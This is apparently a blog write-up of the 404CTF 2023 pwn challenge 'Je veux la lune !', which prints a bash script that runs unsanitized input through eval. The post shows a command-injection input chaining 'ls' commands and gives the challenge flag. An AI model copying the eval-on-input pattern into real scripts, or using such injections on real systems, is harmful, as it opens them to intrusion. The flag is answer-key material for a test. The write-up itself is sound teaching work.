---
title: CTFs | 404CTF2023 | Pwn | Je veux la lune !
author: Stillwolfing
date: 2023-06-12
categories: ['CTFs', '404CTF2023', 'Pwn']
tags: ['CTFs', '404CTF2023', 'Pwn']
permalink: /CTFs/404CTF2023/pwn/je_veux_la_lune_!
---

## Context

![context](/assets/img/CTFs/404CTF2023/pwn/je_veux_la_lune_!/context.png)

We are given this code:

```sh
#!/bin/bash

Caligula=Caius

listePersonnes="Cherea Caesonia Scipion Senectus Lepidus Caligula Caius Drusilla"

echo "Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !

En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?"
read personne
eval "grep -wie ^$personne informations.txt"

while true; do
    echo "
De qui d'autre tu veux que je te parle ?"
    read personne

    if [ -n $personne ] && [ $personne = "stop" ] ; then
    exit
    fi

    bob=$(grep -wie ^$personne informations.txt)
    echo $bob
    if [ -z "$bob" ]; then
        echo "Je n'ai pas compris de qui tu parlais. Dis-moi stop si tu veux que je m'arrête, et envoie l'un des noms que j'ai cités si tu veux des informations."
    else
        echo $bob
    fi  

done
```

The variable "personne" is not sanitized. So we can run do command injection.

if we enter:

```sh
404CTF flag.txt; ls -la; ls
```

The command becomes:

```sh
grep -wie ^404CTF flag.txt; ls -la; ls informations.txt
 ```

![ls_la](/assets/img/CTFs/404CTF2023/pwn/je_veux_la_lune_!/ls_la.png)

We can diplay the content of lune:

![flag](/assets/img/CTFs/404CTF2023/pwn/je_veux_la_lune_!/flag.png)

The flag is: 404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}


























